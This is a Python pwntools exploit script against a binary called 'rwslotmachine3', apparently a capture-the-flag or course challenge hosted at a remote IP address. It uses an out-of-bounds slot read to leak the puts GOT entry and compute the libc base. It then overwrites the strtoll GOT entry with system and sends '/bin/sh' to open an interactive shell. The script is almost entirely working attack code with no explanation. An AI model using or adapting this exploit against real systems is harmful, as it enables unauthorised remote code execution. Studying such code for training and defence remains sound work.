from pwn import *

local = False

if local:
	p = remote('127.0.0.1', 31346)
else:
	p = remote('141.85.224.117', 31346)

libc = ELF("../src/libc.so.6")
binary = ELF('../src/rwslotmachine3')

def do_read(idx):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return int(p.recvuntil('\n')[:-1], 16)

def do_write(idx, value):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(hex(value))

slots_offset = binary.symbols['slots']
strtoll_got_offset = binary.got['strtoll']
puts_got_offset = binary.got['puts']

index_to_puts = (puts_got_offset - slots_offset) / 4
index_to_strtoll = (strtoll_got_offset - slots_offset) / 4

libc_leak = do_read(index_to_puts)
libc_base = libc_leak - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]

p.sendline('3')
p.close()

if local:
	p = remote('127.0.0.1', 1234)
else:
	p = remote('141.85.224.117', 31346)

do_write(index_to_strtoll, system)

p.sendline('/bin/sh')

p.interactive()
